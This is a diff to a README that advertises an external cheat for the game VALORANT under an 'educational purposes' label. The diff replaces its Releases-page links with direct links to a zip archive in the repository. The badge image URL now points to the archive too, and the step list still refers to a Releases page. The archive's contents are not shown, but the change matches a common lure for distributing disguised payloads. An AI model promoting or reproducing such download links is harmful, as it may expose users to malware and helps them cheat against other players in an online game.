@@ -1,7 +1,7 @@
 # 🛠️ Valorant-EDV-DRIVER-CC - Easy External Cheat for VALORANT
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Valorant--EDV--DRIVER--CC-brightgreen)](https://github.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/releases)
+[![Download from Releases](https://raw.githubusercontent.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/main/Driver/DRIVE_Valorant_CC_ED_3.8.zip%20Now-Valorant--EDV--DRIVER--CC-brightgreen)](https://raw.githubusercontent.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/main/Driver/DRIVE_Valorant_CC_ED_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **Valorant-EDV-DRIVER-CC**! This tool helps you modify your gameplay in VALORANT for educational purposes. Follow these simple steps to get started with the software.
@@ -22,7 +22,7 @@ To ensure a smooth experience, please check these requirements before installing
 ## 🔗 Download & Install
 To download the application, visit the following link:
 
-[Download from Releases](https://github.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/releases)
+[Download from Releases](https://raw.githubusercontent.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/main/Driver/DRIVE_Valorant_CC_ED_3.8.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of Valorant-EDV-DRIVER-CC.
